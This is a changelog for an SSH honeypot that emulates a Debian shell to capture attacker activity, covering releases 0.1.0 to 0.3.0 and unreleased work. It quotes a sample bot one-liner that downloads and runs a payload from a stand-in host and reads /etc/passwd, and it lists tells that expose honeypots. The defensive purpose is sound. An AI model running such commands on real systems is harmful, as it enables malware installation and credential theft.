# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

### Added
- Output redirection. `echo '#!/bin/sh' > /tmp/x`, `>>`, `2>`, `&>`, and `2>&1`
  now write the command's output into the virtual filesystem instead of handing
  the operator and target to the command as arguments. Dropping a script with
  `echo … > file` is one of the most common things a bot does, so the old
  behaviour both broke the illusion (`echo x > /tmp/f` printed `x > /tmp/f` and
  created nothing) and lost the payload from the capture. A redirected stage is
  not a terminal, so `ls > f` writes one name per line; `> /dev/null` discards;
  and a target that cannot be opened reports bash's own text
  (`-bash: /nope/f: No such file or directory`, `Permission denied`,
  `Is a directory`, `ambiguous redirect`) without running the command.
- Pipes. `cat /etc/passwd | grep root | wc -l` now runs as a pipeline: each
  stage's output becomes the next stage's stdin and only the last stage's
  output is shown. `cat`, `grep`, `head`, `tail`, and `wc` read that input when
  they are given no file operand, exactly as they read real stdin; a stage that
  ignores stdin (`ls`, `whoami`, …) behaves as it would in a real pipeline. The
  previous behaviour dumped the first command's full output and then reported
  `cat: |: No such file or directory` — recognisable at a glance, and it
  advertised the shell as fake to anyone who piped anything.
- Command separators: `;`, `&&`, and `||` now split a line into commands that
  run in order, with `&&`/`||` gated on the previous exit status. Bot payloads
  are almost always one-liners (`cd /tmp; wget http://x/a; chmod +x a; ./a`);
  each segment used to be handed to the first command as arguments, so the line
  produced `cat: |: No such file or directory`-style nonsense and nothing after
  the first segment was ever captured. Operators inside quotes, or escaped, stay
  literal, and splitting happens before variable expansion — so a `;` arriving
  in a variable's value is data, not an extra command.

### Fixed
- `README.md` described `accept_after` off by one — it said the first N attempts
  are rejected, when `accept_after = N` rejects N−1 and accepts the Nth.
  `deploy/mimic.toml` already had it right; an operator following the README
  would have configured one more failed attempt than they wanted.
- A truncated SCP upload logged the SHA-256 of the stored prefix while reporting
  the full `size`, so the recorded hash matched neither the payload the attacker
  sent nor anything in an IOC feed. The whole body is now hashed as it streams
  in (it was already being read to keep the protocol in sync): `sha256` is the
  complete payload, and the new `stored_sha256` field is the quarantined
  content — the quarantine filename, and identical to `sha256` unless
  `truncated` is set.

### Security
- Backslashes inside double quotes were eaten by the tokenizer, so
  `echo -e "a\tb\nc"` printed `atbnc`. Bash only lets a backslash escape `$`,
  `` ` ``, `"` and `\` inside double quotes and passes every other one through;
  the command now receives what bash would give it, and `echo -e` interprets the
  full GNU escape table (`\e`, `\v`, `\f`, `\0NNN`, `\xHH`, `\c` as well as the
  escapes it already knew). This is the form bot payloads use, and with output
  redirection those bytes now land in the VFS as the capture — so a mangled
  escape corrupted the recorded payload as well as the illusion.
- The 1 MiB output cap now bounds a whole command line, not just one command:
  a chained line could otherwise multiply the per-command cap by the number of
  segments that fit in the 4096-byte input limit.

### Security
- `/usr/bin` listed binaries the shell could not run — `ls /usr/bin` showed
  `python3`, `sed`, `awk`, `perl`, `vi`, `nano`, `gzip`, `ssh`, and `bash`, all
  of which answered `command not found`, and `-bash: bash: command not found` on
  a box whose `$SHELL` is `/bin/bash` identified the honeypot outright. The
  listing is now exactly the set of commands the registry serves, `/usr/sbin`
  holds `ip`/`ss` to match what `which` reports, and a test fails the build if
  the two ever drift apart again.

### Added
- `bash`/`sh`: `-c LINE` runs the line (how bot payloads usually arrive), and a
  bare invocation behaves like an interactive subshell. `scp` as an interactive
  command: local copies work, and a `host:path` operand fails the way an
  unreachable peer would — the binary has to exist, since SCP uploads to this
  host succeed.
- Nested commands (`sudo`, `sh -c`) are capped at 16 levels, so a deeply nested
  line is refused with bash's `fork: retry` error instead of recursing toward a
  stack overflow that would abort the whole daemon.

- `wget`/`curl` no longer contradict themselves: the transfer announced a size
  (`Length: 1394 … saved [1394/1394]`) but left a 0-byte file, so one `ls -l`
  after a download exposed the emulation. The placeholder is now written at the
  size the transfer reports — filled with pseudo-random bytes rather than a
  block of zeros — and the reported figure comes from what actually landed in
  the VFS, so it stays honest when the content cap trims the write. `curl -O`
  also prints its progress table, and `curl -I` reports a matching
  `Content-Length`, instead of both being silent/zero.
- Sessions now export `SSH_CLIENT`, `SSH_CONNECTION`, and — for PTY sessions —
  `SSH_TTY`, the way every real sshd does. A shell that sets none of them is a
  one-command honeypot check (`env | grep SSH_`). The values describe the real
  connection (the client's own address and the socket it dialled) and survive
  `su`, since they belong to the connection rather than the logged-in identity.
- Fixed the absolute session lifetime cap (`max_session_secs`) never ending a
  session. The cap fired on schedule and logged `session_timeout`, but the
  session kept serving commands until the idle timeout, so a client sending
  traffic just inside `idle_timeout_secs` could hold a session — and the per-IP
  connection slot it occupies — indefinitely, and enough such connections could
  fill the global session cap and lock out real attacker traffic. The cap now
  disconnects the session, and its clock starts when the connection is accepted.

## [0.3.0] - 2026-07-30

### Added
- Optional file-based logging. Set `logging.dir` to have forensic events written
  to a daily-rotated `mimic.YYYY-MM-DD.jsonl` file (in addition to stdout), ready
  for a log shipper such as Filebeat/Logstash or manual inspection. Logs are
  never deleted by default; set `logging.retention_days` to cap how many daily
  files are kept. The compose stack pre-creates `/data/logs` for this.

### Fixed
- SSH shell and one-shot command requests now receive the required protocol
  success reply, preventing clients such as PuTTY from reporting that the
  server refused to start a shell or command after authentication.
- One-shot SSH `exec` requests now return the emulated command's real exit
  status instead of always reporting success.

### Changed
- `su` (and `su USER`) now shows a realistic `Password:` prompt with echo
  suppressed when run by a non-root user, instead of switching identity
  instantly. The typed secret is captured as an `auth_attempt` event (method
  `su`) before the switch. Root still switches without a prompt, like real
  `su`. This removes the "instant, password-less root" honeypot tell.
- Default `auth.mode` (when no config file, or a config file without an
  `[auth]` section, is used) is now `accept_all` instead of `accept_after`.
  Zero-config runs previously rejected the first `accept_after` (default 2)
  attempts on every connection, which is both an unrealistic-looking default
  and gives attackers fewer sessions to capture commands in; `accept_all`
  grants a shell immediately for maximum interaction.

### Security
- Fixed a whole-process denial of service: `mv` could move a directory into its
  own subtree (`mv a a/b`), making the virtual filesystem cyclic. Path rendering
  then looped forever while growing memory, and `find`/`grep -r`/`chmod -R`
  recursed until the stack overflowed and aborted the daemon — killing every
  session, not just the offending one. The move is now refused with the same
  error real `mv` gives, and path rendering is bounded regardless.
- Release builds no longer set `panic = "abort"`. The documented per-session
  crash-isolation guarantee depends on unwinding; under abort a panic in any one
  session would have taken the listener and all other sessions down with it.
- Replaced the `find -name` glob matcher with an iterative single-backtrack
  implementation. The recursive one was exponential on patterns such as
  `*a*a*a*a*b`, letting a single `find` peg a worker thread indefinitely — with
  no timeout able to fire on it, since the command runs synchronously.
- The log directory (`logging.dir`) is now created `0700` on Unix. Captured
  passwords are written there in cleartext, and the rotated files were being
  created world-readable.
- Documented that the Docker daily-reset sidecar is granted the host's Docker
  socket, that `:ro` does not restrict Docker API calls, and that the systemd
  timer is the lower-privilege alternative.
- Limited each SSH connection to one active session channel at a time, while
  still allowing sequential channels. This prevents channel floods from
  bypassing connection limits and stops shell, password, and SCP state from
  leaking between concurrent channels.
- Rebalanced the shipped memory-related defaults for public traffic: 32 global
  connections, 4 per source IP, 8 MiB uploads and VFS content, and 2,000 VFS
  nodes per session under a 1 GiB deployment memory ceiling.
- `ls` now enforces directory read permissions: an unprivileged user listing a
  directory it cannot read (e.g. `ls /root`, mode `0700`) gets
  `ls: cannot open directory '...': Permission denied` instead of a full
  listing, closing a honeypot tell that let attackers read protected paths.
- Fixed a fingerprint where a rejected password immediately dropped the
  connection with `Permission denied (publickey)` instead of re-prompting. On
  rejection the server now keeps offering the `password` method, so clients
  re-prompt like a real sshd (up to `MaxAuthTries`). This also restores
  `accept_after`, which could never see a second attempt on one connection
  while the method was being withdrawn after the first failure.

### Added
- More emulated commands, for closer parity with a real Debian shell and the
  recon scripts attackers commonly run: `head`/`tail` (`-n`/`-c`/`-N`, per-file
  `==>` headers), `wc` (`-l`/`-w`/`-c`), `groups`, `arch`, `tty`, `date`
  (`+FORMAT` strftime, real UTC clock), `lsb_release` (`-a`/`-s`/`-i`/`-d`/`-r`/
  `-c`, Debian 12 "bookworm"), and `dmesg`. `dmesg` mirrors Debian's
  `kernel.dmesg_restrict=1` default: it returns the fabricated kernel ring
  buffer only to root and "Operation not permitted" otherwise. All new commands
  remain pure functions over the in-memory VFS and shell state — no real
  process, filesystem, or clock-setting access — and the escape-vector test
  still enforces that boundary.

## [0.2.0] - 2026-07-07

### Added
- Daily automatic reset: wipes quarantine data and restarts the honeypot once
  per day at a random time within a configurable window (default 0–3 hours) so
  the restart is not predictable. Supported in Docker (sidecar container) and
  systemd (timer + oneshot service).
- `sensor_name` config key: an identifier included in every JSON log line so
  operators running multiple sensors can distinguish their streams (closes #3).
- New emulated commands: `sudo` (transient elevation), `su` (persistent
  identity switch), `nproc`/`lscpu` (matching the existing fake `/proc/cpuinfo`),
  `tar` (create writes a placeholder archive; extract/list on a fake
  0-byte/garbage "download" reports the same corrupt-archive errors a real
  host would), and `pkill` (tab-completion already offered it; it previously
  fell through to "command not found"). `grep` and `find` — previously
  documented as "(stub)" in the README but not actually wired into the
  command dispatch table at all — now do real (if simplified) substring
  search and path traversal.

### Fixed
- `dpkg`/`apt` listed `sudo` as installed and `id` reported `sudo` group
  membership, but running `sudo` itself returned "command not found" — an
  inconsistency an attacker could notice. `sudo` is now implemented.
- `pty-req`, `env`, `window-change`, subsystem, and agent-forwarding channel
  requests were left unanswered (russh's default `Handler` impl neither
  succeeds nor fails them), unlike a real sshd which always replies. Most
  interactive `ssh` clients send `pty-req` before `shell` and tolerate the
  missing reply, but it's a cheap, passive fingerprinting signal for anything
  that checks it. Now replied to explicitly: `pty-req`/`window-change` always
  succeed; `env` succeeds only for `LANG`/`LC_*` (matching Debian's default
  `AcceptEnv`); subsystem and agent-forwarding requests fail cleanly, since
  neither is emulated.

### Security
- Bounded per-session real-disk quarantine writes (`max_upload_bytes` × 32)
  so a flood of many distinct SCP-uploaded files can no longer grow the
  quarantine store without limit for the duration of a session; the
  in-memory VFS mirror (already bounded) is unaffected.
- Host keys are now created with `0600` permissions atomically (via
  `OpenOptions` at file-creation time) instead of being chmod'd after a
  world/group-readable `std::fs::write`, closing a brief window where a
  newly generated private key was readable by other local users.
- Quarantined SCP uploads are now created `0600` atomically at file-creation
  time (same `OpenOptions` approach as host keys) instead of being chmod'd
  after a world/group-readable write, removing the brief window where a
  captured sample was readable by other local users. The `create_new` write
  also closes the previous exists()-then-write race between concurrent
  sessions storing the same content-addressed payload.
- `cat` and `grep` now enforce Unix read permissions (owner/group/other bits,
  root bypass) against the emulated VFS, matching real Debian instead of
  ignoring file modes entirely. Previously any unprivileged session could
  `cat`/`grep` a `0640` root-owned file like `/etc/shadow` — both an
  unrealistic tell (real Debian denies it) and, combined with the fake
  password hash literally containing the word "honeypot", an instant
  self-identifying giveaway. The fake `/etc/shadow` hash is also now a
  random-looking, non-identifying string.
- `tar -c` no longer writes a plaintext `MIMIC-FAKE-TAR-ARCHIVE` marker into
  its placeholder archive; an attacker who created and then `cat`ed the
  archive would see the product name directly. It now writes non-identifying
  binary-looking bytes (a gzip magic header followed by random data), and
  extract/list behavior on it is unchanged (still reports a corrupt archive).

## [0.1.0] - 2026-07-02

Initial release.

### Added
- Escape-proof SSH honeypot emulating a Debian 12 server via a pure
  state-machine architecture — no `std::process`, no real filesystem access
  in the emulation layer, `#![forbid(unsafe_code)]` project-wide.
- ~30 emulated shell commands with readline-style line editing, history,
  MOTD, and `/proc` fakes.
- In-memory virtual filesystem bounded by node count (10k) and total
  content size (64 MiB).
- SCP upload support with configurable size cap (16 MiB default) and
  quarantine store for captured payloads.
- Structured JSON logging of sessions, credentials, and commands.
- Connection hardening: global and per-IP connection limits enforced
  before crypto, session and idle timeouts, bounded line/exec/output
  lengths.
- Docker deployment: distroless non-root runtime, read-only rootfs,
  dropped capabilities, resource limits.
- CI: clippy (`-D warnings`), full test suite, cargo-deny supply-chain
  audit with weekly scheduled run.

[Unreleased]: https://github.com/Kevin1S1/mimic-ssh-honeypot/compare/v0.3.0...HEAD
[0.3.0]: https://github.com/Kevin1S1/mimic-ssh-honeypot/compare/v0.2.0...v0.3.0
[0.2.0]: https://github.com/Kevin1S1/mimic-ssh-honeypot/compare/v0.1.0...v0.2.0
[0.1.0]: https://github.com/Kevin1S1/mimic-ssh-honeypot/releases/tag/v0.1.0
